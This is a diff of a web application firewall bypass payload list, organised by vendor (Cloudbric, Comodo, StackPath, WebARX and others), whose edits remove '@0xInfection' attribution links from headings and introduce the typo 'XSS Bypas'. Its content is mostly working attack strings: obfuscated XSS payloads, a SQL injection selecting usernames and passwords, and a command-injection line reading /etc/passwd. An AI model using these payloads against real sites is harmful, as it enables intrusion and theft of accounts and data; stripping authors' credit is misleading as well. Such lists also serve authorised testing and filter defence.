@@ -3304,7 +3304,7 @@ GET /cgi-mod/index.cgi?&primary_tab=ADVANCED&secondary_tab=test_backup_server&co
 Host: favoritewaf.com
 User-Agent: Mozilla/5.0 (compatible; MSIE5.01; Windows NT)
 ```
-- XSS Bypass by [@0xInfection](https://twitter.com/0xInfection)
+- XSS Bypass
 ```
 <a href=j%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At:open()>clickhere
 ```
@@ -3394,13 +3394,13 @@ cat$u+/etc$u/passwd$u
 ```
 
 ### Cloudbric
-- [XSS Bypass](https://twitter.com/0xInfection/status/1212331839743873026) by [@0xInfection](https://twitter.com/0xinfection)
+- XSS Bypass
 ```
 <a69/onclick=[1].findIndex(alert)>pew
 ```
 
 ### Comodo 
-- XSS Bypass by [@0xInfection](https://twitter.com/0xinfection)
+- XSS Bypass
 ```
 <input/oninput='new Function`confir\u006d\`0\``'>
 <p/ondragstart=%27confirm(0)%27.replace(/.+/,eval)%20draggable=True>dragme
@@ -3453,7 +3453,7 @@ Keep-Alive: 300
 <isindex action="javas&tab;cript:alert(1)" type=image>
 <marquee/onstart=confirm(2)>
 ```
-- XSS Bypass by [@0xInfection](https://twitter.com/0xinfection)
+- XSS Bypas
 ```
 <p draggable=True ondragstart=prompt()>alert
 <bleh/ondragstart=&Tab;parent&Tab;['open']&Tab;&lpar;&rpar;%20draggable=True>dragme
@@ -3625,15 +3625,15 @@ amUserId=1 union select username,password,3,4 from users
 ```html
 <input id='a'value='global'><input id='b'value='E'><input 'id='c'value='val'><input id='d'value='aler'><input id='e'value='t(documen'><input id='f'value='t.domain)'><svg+onload[\r\n]=$[a.value+b.value+c.value](d.value+e.value+f.value)>
 ```
-- [XSS Bypass](https://twitter.com/0xInfection/status/1420046446095519749) by [@0xInfection](https://twitter.com/0xInfection)
+- XSS Bypass
 ```html
 <x/onclick=globalThis&lsqb;'\u0070r\u006f'+'mpt']&lt;)>clickme
 ```
-- [XSS Bypass](https://twitter.com/0xInfection/status/1364622858090016777) by [@0xInfection](https://twitter.com/0xInfection)
+- XSS Bypass
 ```html
 <a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)" />click
 ```
-- [XSS Bypass](https://twitter.com/0xInfection/status/1212331839743873026) by [@0xInfection](https://twitter.com/0xinfection)
+- XSS Bypass
 ```html
 <a69/onclick=write&lpar;&rpar;>pew
 ```
@@ -3695,7 +3695,7 @@ asd"on+<>+onpointerenter%3d"x%3dconfirm,x(cookie)
 ```
 ?"></script><base%20c%3D=href%3Dhttps:\mysite>
 ```
-- XSS Bypass by [@0xInfection](https://twitter.com/0xInfection)
+- XSS Bypas
 ```
 <abc/onmouseenter=confirm%60%60>
 ```
@@ -3767,7 +3767,7 @@ data:text/html,<form action=https://brutelogic.com.br/xss-cp.php method=post>
 ```
 
 ### StackPath
-- [XSS Bypass](https://twitter.com/0xInfection/status/1298642820664823808) by [@0xInfection](https://twitter.com/0xInfection)
+- XSS Bypass
 ```
 <object/data=javascript:alert()>
 <a/href="javascript%0A%0D:alert()>clickme
@@ -3780,7 +3780,7 @@ http://host.com/test.asp?file=.%./bla.txt
 ```
 
 ### WebARX
-- Cross Site Scripting by [@0xInfection](https://twitter.com/0xinfection)
+- Cross Site Scripting 
 ```
 <a69/onauxclick=open&#40&#41>rightclickhere
 ```
@@ -3829,7 +3829,7 @@ http://host.com/test.asp?file=.%./bla.txt
 <a href=javas&#99;ript:alert(1)>
 <a href=&#01javascript:alert(1)>
 ```
-- XSS Bypass by [@0xInfection](https://twitter.com/0xInfection)
+- XSS Bypass
 ```
 <a/**/href=j%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At&colon;/**/alert()/**/>click
 ```
